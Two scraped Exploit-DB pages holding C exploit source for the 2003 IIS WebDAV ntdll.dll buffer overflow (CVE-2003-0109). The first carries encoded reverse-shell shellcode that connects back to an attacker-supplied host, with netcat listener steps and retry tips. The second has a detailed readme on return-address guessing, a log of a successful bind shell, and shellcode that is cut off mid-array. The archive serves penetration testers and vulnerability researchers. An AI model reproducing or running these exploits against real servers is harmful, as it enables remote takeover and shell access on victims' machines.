#~ 1
Microsoft IIS - WebDAV 'ntdll.dll' Remote Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft IIS - WebDAV 'ntdll.dll' Remote OverflowEDB-ID:1CVE:2003-0109EDB Verified:Author:kralorType:remoteExploit:/Platform:WindowsDate:2003-03-23Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*******************************************************************//* [Crpt] ntdll.dll exploit trough WebDAV by kralor [Crpt] *//* --------------------------------------------------------------- *//* this is the exploit for ntdll.dll through WebDAV. *//* run a netcat ex: nc -L -vv -p 666 *//* wb server.com your_ip 666 0 *//* the shellcode is a reverse remote shell *//* you need to pad a bit.. the best way I think is launching *//* the exploit with pad = 0 and after that, the server will be *//* down for a couple of seconds, now retry with pad at 1 *//* and so on..pad 2.. pad 3.. if you haven't the shell after *//* something like pad at 10 I think you better to restart from *//* pad at 0. On my local IIS the pad was at 1 (0x00110011) but *//* on all the others servers it was at 2,3,4, etc..sometimes *//* you can have the force with you, and get the shell in 1 try *//* sometimes you need to pad more than 10 times ;) *//* the shellcode was coded by myself, it is SEH + ScanMem to *//* find the famous offsets (GetProcAddress).. *//* *//*******************************************************************/#include <winsock.h>#include <windows.h>#include <stdio.h>#pragma comment (lib,"ws2_32")char shellc0de[] ="\x55\x8b\xec\x33\xc9\x53\x56\x57\x8d\x7d\xa2\xb1\x25\xb8\xcc\xcc""\xcc\xcc\xf3\xab\xeb\x09\xeb\x0c\x58\x5b\x59\x5a\x5c\x5d\xc3\xe8""\xf2\xff\xff\xff\x5b\x80\xc3\x10\x33\xc9\x66\xb9\xb5\x01\x80\x33""\x95\x43\xe2\xfa\x66\x83\xeb\x67\xfc\x8b\xcb\x8b\xf3\x66\x83\xc6""\x46\xad\x56\x40\x74\x16\x55\xe8\x13\x00\x00\x00\x8b\x64\x24\x08""\x64\x8f\x05\x00\x00\x00\x00\x58\x5d\x5e\xeb\xe5\x58\xeb\xb9\x64""\xff\x35\x00\x00\x00\x00\x64\x89\x25\x00\x00\x00\x00\x48\x66\x81""\x38\x4d\x5a\x75\xdb\x64\x8f\x05\x00\x00\x00\x00\x5d\x5e\x8b\xe8""\x03\x40\x3c\x8b\x78\x78\x03\xfd\x8b\x77\x20\x03\xf5\x33\xd2\x8b""\x06\x03\xc5\x81\x38\x47\x65\x74\x50\x75\x25\x81\x78\x04\x72\x6f""\x63\x41\x75\x1c\x81\x78\x08\x64\x64\x72\x65\x75\x13\x8b\x47\x24""\x03\xc5\x0f\xb7\x1c\x50\x8b\x47\x1c\x03\xc5\x8b\x1c\x98\x03\xdd""\x83\xc6\x04\x42\x3b\x57\x18\x75\xc6\x8b\xf1\x56\x55\xff\xd3\x83""\xc6\x0f\x89\x44\x24\x20\x56\x55\xff\xd3\x8b\xec\x81\xec\x94\x00""\x00\x00\x83\xc6\x0d\x56\xff\xd0\x89\x85\x7c\xff\xff\xff\x89\x9d""\x78\xff\xff\xff\x83\xc6\x0b\x56\x50\xff\xd3\x33\xc9\x51\x51\x51""\x51\x41\x51\x41\x51\xff\xd0\x89\x85\x94\x00\x00\x00\x8b\x85\x7c""\xff\xff\xff\x83\xc6\x0b\x56\x50\xff\xd3\x83\xc6\x08\x6a\x10\x56""\x8b\x8d\x94\x00\x00\x00\x51\xff\xd0\x33\xdb\xc7\x45\x8c\x44\x00""\x00\x00\x89\x5d\x90\x89\x5d\x94\x89\x5d\x98\x89\x5d\x9c\x89\x5d""\xa0\x89\x5d\xa4\x89\x5d\xa8\xc7\x45\xb8\x01\x01\x00\x00\x89\x5d""\xbc\x89\x5d\xc0\x8b\x9d\x94\x00\x00\x00\x89\x5d\xc4\x89\x5d\xc8""\x89\x5d\xcc\x8d\x45\xd0\x50\x8d\x4d\x8c\x51\x6a\x00\x6a\x00\x6a""\x00\x6a\x01\x6a\x00\x6a\x00\x83\xc6\x09\x56\x6a\x00\x8b\x45\x20""\xff\xd0""CreateProcessA\x00LoadLibraryA\x00ws2_32.dll\x00WSASocketA\x00""connect\x00\x02\x00\x02\x9A\xC0\xA8\x01\x01\x00""cmd" // don't change anything.."\x00\x00\xe7\x77" // offsets of kernel32.dll for some win ver.."\x00\x00\xe8\x77""\x00\x00\xf0\x77""\x00\x00\xe4\x77""\x00\x88\x3e\x04" // win2k3"\x00\x00\xf7\xbf" // win9x =P"\xff\xff\xff\xff";int test_host(char *host){char search[100]="";int sock;struct hostent *heh;struct sockaddr_in hmm;char buf[100] ="";if(strlen(host)>60) {printf("error: victim host too long.\r\n");return 1;}if ((heh = gethostbyname(host))==0){printf("error: can't resolve '%s'",host);return 1;}sprintf(search,"SEARCH / HTTP/1.1\r\nHost: %s\r\n\r\n",host);hmm.sin_port = htons(80);hmm.sin_family = AF_INET;hmm.sin_addr = *((struct in_addr *)heh->h_addr);if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1){printf("error: can't create socket");return 1;}printf("Checking WebDav on '%s' ... ",host);if ((connect(sock, (struct sockaddr *) &hmm, sizeof(hmm))) == -1){printf("CONNECTING_ERROR\r\n");return 1;}send(sock,search,strlen(search),0);recv(sock,buf,sizeof(buf),0);if(buf[9]=='4'&&buf[10]=='1'&&buf[11]=='1')return 0;printf("NOT FOUND\r\n");return 1;}void help(char *program){printf("syntax: %s <victim_host> <your_host> <your_port> [padding]\r\n",program);return;}void banner(void){printf("\r\n\t [Crpt] ntdll.dll exploit trough WebDAV by kralor[Crpt]\r\n");printf("\t\twww.coromputer.net && undernet #coromputer\r\n\r\n");return;}void main(int argc, char *argv[]){WSADATA wsaData;unsigned short port=0;char *port_to_shell="", *ip1="", data[50]="";unsigned int i,j;unsigned int ip = 0 ;int s, PAD=0x10;struct hostent *he;struct sockaddr_in crpt;char buffer[65536] ="";char request[80000]; // huuuh, what a mess! :)char content[] ="<?xml version=\"1.0\"?>\r\n""<g:searchrequest xmlns:g=\"DAV:\">\r\n""<g:sql>\r\n""Select \"DAV:displayname\" from scope()\r\n""</g:sql>\r\n""</g:searchrequest>\r\n";banner();if((argc<4)||(argc>5)) {help(argv[0]);return;}if(WSAStartup(0x0101,&wsaData)!=0) {printf("error starting winsock..");return;}if(test_host(argv[1]))return;if(argc==5)PAD+=atoi(argv[4]);printf("FOUND\r\nexploiting ntdll.dll through WebDav [ret: 0x00%02x00%02x]\r\n",PAD,PAD);ip = inet_addr(argv[2]); ip1 = (char*)&ip;shellc0de[448]=ip1[0]; shellc0de[449]=ip1[1]; shellc0de[450]=ip1[2];shellc0de[451]=ip1[3];port = htons(atoi(argv[3]));port_to_shell = (char *) &port;shellc0de[446]=port_to_shell[0];shellc0de[447]=port_to_shell[1];// we xor the shellcode [xored by 0x95 to avoid bad chars]__asm {lea eax, shellc0deadd eax, 0x34xor ecx, ecxmov cx, 0x1b0wah:xor byte ptr[eax], 0x95inc eaxloop wah}if ((he = gethostbyname(argv[1]))==0){printf("error: can't resolve '%s'",argv[1]);return;}crpt.sin_port = htons(80);crpt.sin_family = AF_INET;crpt.sin_addr = *((struct in_addr *)he->h_addr);if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){printf("error: can't create socket");return;}printf("Connecting... ");if ((connect(s, (struct sockaddr *) &crpt, sizeof(crpt))) == -1){printf("ERROR\r\n");return;}// No Operation.for(i=0;i<sizeof(buffer);buffer[i]=(char)0x90,i++);// fill the buffer with the shellcodefor(i=64000,j=0;i<sizeof(buffer)&&j<sizeof(shellc0de)-1;buffer[i]=shellc0de[j],i++,j++);// well..it is not necessary..for(i=0;i<2500;buffer[i]=PAD,i++);/* we can simply put our ret in this 2 offsets.. *///buffer[2086]=PAD;//buffer[2085]=PAD;buffer[sizeof(buffer)]=0x00;memset(request,0,sizeof(request));memset(data,0,sizeof(data));sprintf(request,"SEARCH /%s HTTP/1.1\r\nHost: %s\r\nContent-type: text/xml\r\nContent-Length: ",buffer,argv[1]);sprintf(request,"%s%d\r\n\r\n",request,strlen(content));printf("CONNECTED\r\nSending evil request... ");send(s,request,strlen(request),0);send(s,content,strlen(content),0);printf("SENT\r\n");recv(s,data,sizeof(data),0);if(data[0]!=0x00) {printf("Server seems to be patched.\r\n");printf("data: %s\r\n",data);} elseprintf("Now if you are lucky you will get a shell.\r\n");closesocket(s);return;}// milw0rm.com [2003-03-23]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 2
Microsoft IIS 5.0 - WebDAV Remote - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft IIS 5.0 - WebDAV RemoteEDB-ID:2CVE:2003-0109EDB Verified:Author:RoMaNSoFtType:remoteExploit:/Platform:WindowsDate:2003-03-24Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*************************************//* IIS 5.0 WebDAV -Proof of concept- *//* [ Bug: CAN-2003-0109 ] *//* By Roman Medina-Heigl Hernandez *//* aka RoMaNSoFt <roman@rs-labs.com> *//* Madrid, 23.Mar.2003 *//* ================================= *//* Public release. Version 1. *//* --------------------------------- *//*************************************//* ====================================================================* --[ READ ME ]** This exploit is mainly a proof of concept of the recently discovered ntdll.dll bug (which may be* exploited in many other programs, not necessarily IIS). Practical exploitation is not as easy as* expected due to difficult RET guessing mixed with possible IIS crashes (which makes RET brute* forcing a tedious work). The shellcode included here will bind a cmd.exe shell to a given port* at the victim machine so it could be problematic if that machine is protected behind a firewall.* For all these reasons, the scope of this code is limited and mainly intended for educational* purposes. I am not responsible of possible damages created by the use of this exploit code.** The program sends a HTTP request like this:** SEARCH /[nop] [ret][ret][ret] ... [ret] [nop][nop][nop][nop][nop] ... [nop] [jmpcode] HTTP/1.1* {HTTP headers here}* {HTTP body with webDAV content}* 0x01 [shellcode]** IIS converts the first ascii string ([nop]...[jmpcode]) to Unicode using UTF-16 encoding (for* instance, 0x41 becomes 0x41 0x00, i.e. an extra 0x00 byte is added) and it is the resultant* Unicode string the one producing the overflow. So at first glance, we cannot include code here* (more on this later) because it would get corrupted by 0x00 (and other) inserted bytes. Not at* least using the common method. Another problem that we will have to live with is our RET value* being padded with null bytes, so if we use 0xabcd in our string, the real RET value (i.e. the* one EIP will be overwritten with) would be 0x00ab00cd. This is an important restriction.** We have two alternatives:** 1) The easy one: find any occurrences of our ascii string (i.e. before it gets converted to* the Unicode form) in process memory. Problem: normally we should find it by debugging the* vulnerable application and then hardcode the found address (which will be the RET address)* in our exploit code. This RET address is variable, even for the same version of OS and app* (I mean, different instances of the same application in the same machine could make the* guessed RET address invalid at different moments). Now add the restriction of RET value* padded with null-bytes. Anyway, the main advantage of this method is that we will not have* to deal with 0x00-padded shellcode.** 2) The not so-easy one: you could insert an encoded shellcode in such a way that when the app* expands the ascii string (with the encoded shellcode) to Unicode, a valid shellcode is* automagically placed into memory. Please, refer to Chris Anley's "venetian exploit" paper* to read more about this. Dave Aitel also has a good paper about this technique and indeed* he released code written in Python to encode shellcode (I'm wondering if he will release a* working tool for that purpose, since the actual code was released as part of a commercial* product, so it cannot be run without buying the whole product, despite the module itself* being free!). Problem: it is not so easy as the first method ;-) Advantage: when the over-* flow happens, some registers may point to our Unicoded string (where our Unicoded-shellcode* lives in), so we don't need to guess the address where shellcode will be placed and the* chance of a successful exploitation is greatly improved. For instance, in this case, when* IIS is overflowed, ECX register points to the Unicode string. The idea is then fill in* RET value with the fixed address of code like "call %ecx". This code may be contained in* any previosly-loaded library, for example).** Well, guess it... yes... I chose the easy method :-) Perhaps I will rewrite the exploit* using method 2, but I cannot promise that.** Let's see another problem of the method 1 (which I have used). Not all Unicode conversions* result in a 0x00 byte being added. This is true for ascii characters lower or equal to 0x7f* (except for some few special characters, I'm not sure). But our shellcode will have bytes* greater than 0x7f value. So we don't know the exact length of the Unicoded-string containing* our shellcode (some ascii chars will expand to more than 2 bytes, I think). As a result,* sometimes the exploit may not work, because no exact length is matched. For instance, if you* carry out experiments on this issue, you could see that IIS crashes (overflow occurs) when* entering a query like SEARCH /AAAA...AAA HTTP/1.1, with 65535 A's. Same happens with 65536.* But with different values seems NOT to work. So matching the exact length is important here!** What I have done, it is to include a little "jumpcode" instead of the shellcode itself. The* jumpcode is placed into the "critical" place and has a fixed length, so our string has always* a fixed length, too. The "variable" part (the shellcode) is placed at the end of the HTTP* request (so you can insert your own shellcode and remove the one I'm using here, with no apparent* problem). To be precise, the end of the request will be: 0x01 [shellcode]. The 0x01 byte marks* the beginning of the shellcode and it is used by the jumpcode to find the address where shell-* code begins and jump into it. It is not possible to hardcode a relative jump, because HTTP* headers have a variable length (think about the "Host:" header and you will understand what* I'm saying). Well, really, the exploit could have calculated the relative jump itself (other* problems arise like null-bytes possibly contained in the offset field) but I have prefered to* use the 0x01 trick. It's my exploit, it's my choice :-)** After launching the exploit, several things may happen:* - the exploit is successful. You can connect to the bound port of victim machine and get a* shell. Great. Remember that when you issue an "exit" command in the shell prompt, the pro-* cess will be terminated. This implies that IIS could die.* - exploit returns a "server not vulnerable" response. Really, the server may not be vulnerable* or perhaps the SEARCH method used by the exploit is not permitted (the bug can still be* exploited via GET, probably) or webDAV is disabled at all.* - exploit did not get success (which is not strange, since it is not easy to guess RET value)* but the server is vulnerable. IIS will probably not survive: a "net start w3svc" could be* needed in the victim machine, in order to restart the WWW service.** The following log shows a correct exploitation:** roman@goliat:~/iis5webdav> gcc -o rs_iis rs_iis.c* roman@goliat:~/iis5webdav> ./rs_iis roman* [*] Resolving hostname ...* [*] Attacking port 80 at roman (EIP = 0x00480004)...* [*] Now open another console/shell and try to connect (telnet) to victim port 31337...** roman@goliat:~/iis5webdav> telnet roman 31337* Trying 192.168.0.247...* Connected to roman.* Escape character is '^]'.* Microsoft Windows 2000 [Versi¢n 5.00.2195]* (C) Copyright 1985-2000 Microsoft Corp.** C:\WINNT\system32>*** I am not going to show logs for the faulty cases. I'm pretty sure you will see them very* soon :-) But yes, the exploit works, perhaps a little fine-tunning may be required, though.* So please, do NOT contact me telling that the exploit doesn't work or things like that. It* worked for me and it will work for you, if you're not a script-kiddie. Try to attach to the* IIS process (inetinfo.exe) with the help of a debugger (OllyDbg is my favourite) on the* victim machine and then launch the exploit against it. Debugger will break when the first* exception is produced. Now place a breakpoint in 0x00ab00cd (being 0xabcd the not-unicoded* RET value) and resume execution until you reach that point. Finally, it's time to search* the memory looking for our shellcode. It is nearly impossible (very low chance) that our* shellcode is found at any 0x00**00**-form address (needed to bypass the RET restriction* imposed by Unicode conversion) but no problem: you have a lot of NOPs before the shellcode* where you could point to. If EIP is overwritten with the address of such a NOP, program flow* will finish reaching our shellcode. Note also that among the two bytes of RET that we have some* kind of control, the more important is the first one, i.e. the more significant. In other* words, interesting RET values to try are: 0x0104, 0x0204, 0x0304, 0x0404, 0x0504, ...,* and so on, till 0xff04. As you may have noticed, the last byte (0x04) is never changed because* its weight is minimal (256 between aprox. 65000 NOP's is not appreciable).*** My best wishes,* --Roman** ===================================== --[ EOT ]-- ====================*/#include <stdio.h>#include <errno.h>#include <string.h>#include <stdlib.h>#include <sys/types.h>#include <sys/socket.h>#include <netdb.h>#include <netinet/in.h>// Change to fit your need#define RET 0x4804 // EIP = 0x00480004#define LOADLIBRARYA 0x0100107c#define GETPROCADDRESS 0x01001034// Don't change this#define PORT_OFFSET 1052#define LOADL_OFFSET 798#define GETPROC_OFFSET 815#define NOP 0x90#define MAXBUF 100000/** LoadLibraryA IT Address := 0100107C* GetProcAddress IT Address := 01001034*/unsigned char shellcode[] = // Deepzone shellcode"\x68\x5e\x56\xc3\x90\x54\x59\xff\xd1\x58\x33\xc9\xb1\x1c""\x90\x90\x90\x90\x03\xf1\x56\x5f\x33\xc9\x66\xb9\x95\x04""\x90\x90\x90\xac\x34\x99\xaa\xe2\xfa\x71\x99\x99\x99\x99""\xc4\x18\x74\x40\xb8\xd9\x99\x14\x2c\x6b\xbd\xd9\x99\x14""\x24\x63\xbd\xd9\x99\xf3\x9e\x09\x09\x09\x09\xc0\x71\x4b""\x9b\x99\x99\x14\x2c\xb3\xbc\xd9\x99\x14\x24\xaa\xbc\xd9""\x99\xf3\x93\x09\x09\x09\x09\xc0\x71\x23\x9b\x99\x99\xf3""\x99\x14\x2c\x40\xbc\xd9\x99\xcf\x14\x2c\x7c\xbc\xd9\x99""\xcf\x14\x2c\x70\xbc\xd9\x99\xcf\x66\x0c\xaa\xbc\xd9\x99""\xf3\x99\x14\x2c\x40\xbc\xd9\x99\xcf\x14\x2c\x74\xbc\xd9""\x99\xcf\x14\x2c\x68\xbc\xd9\x99\xcf\x66\x0c\xaa\xbc\xd9""\x99\x5e\x1c\x6c\xbc\xd9\x99\xdd\x99\x99\x99\x14\x2c\x6c""\xbc\xd9\x99\xcf\x66\x0c\xae\xbc\xd9\x99\x14\x2c\xb4\xbf""\xd9\x99\x34\xc9\x66\x0c\xca\xbc\xd9\x99\x14\x2c\xa8\xbf""\xd9\x99\x34\xc9\x66\x0c\xca\xbc\xd9\x99\x14\x2c\x68\xbc""\xd9\x99\x14\x24\xb4\xbf\xd9\x99\x3c\x14\x2c\x7c\xbc\xd9""\x99\x34\x14\x24\xa8\xbf\xd9\x99\x32\x14\x24\xac\xbf\xd9""\x99\x32\x5e\x1c\xbc\xbf\xd9\x99\x99\x99\x99\x99\x5e\x1c""\xb8\xbf\xd9\x99\x98\x98\x99\x99\x14\x2c\xa0\xbf\xd9\x99""\xcf\x14\x2c\x6c\xbc\xd9\x99\xcf\xf3\x99\xf3\x99\xf3\x89""\xf3\x98\xf3\x99\xf3\x99\x14\x2c\xd0\xbf\xd9\x99\xcf\xf3""\x99\x66\x0c\xa2\xbc\xd9\x99\xf1\x99\xb9\x99\x99\x09\xf1""\x99\x9b\x99\x99\x66\x0c\xda\xbc\xd9\x99\x10\x1c\xc8\xbf""\xd9\x99\xaa\x59\xc9\xd9\xc9\xd9\xc9\x66\x0c\x63\xbd\xd9""\x99\xc9\xc2\xf3\x89\x14\x2c\x50\xbc\xd9\x99\xcf\xca\x66""\x0c\x67\xbd\xd9\x99\xf3\x9a\xca\x66\x0c\x9b\xbc\xd9\x99""\x14\x2c\xcc\xbf\xd9\x99\xcf\x14\x2c\x50\xbc\xd9\x99\xcf""\xca\x66\x0c\x9f\xbc\xd9\x99\x14\x24\xc0\xbf\xd9\x99\x32""\xaa\x59\xc9\x14\x24\xfc\xbf\xd9\x99\xce\xc9\xc9\xc9\x14""\x2c\x70\xbc\xd9\x99\x34\xc9\x66\x0c\xa6\xbc\xd9\x99\xf3""\xa9\x66\x0c\xd6\xbc\xd9\x99\x72\xd4\x09\x09\x09\xaa\x59""\xc9\x14\x24\xfc\xbf\xd9\x99\xce\xc9\xc9\xc9\x14\x2c\x70""\xbc\xd9\x99\x34\xc9\x66\x0c\xa6\xbc\xd9\x99\xf3\xc9\x66""\x0c\xd6\xbc\xd9\x99\x1a\x24\xfc\xbf\xd9\x99\x9b\x96\x1b""\x8e\x98\x99\x99\x18\x24\xfc\xbf\xd9\x99\x98\xb9\x99\x99""\xeb\x97\x09\x09\x09\x09\x5e\x1c\xfc\xbf\xd9\x99\x99\xb9""\x99\x99\xf3\x99\x12\x1c\xfc\xbf\xd9\x99\x14\x2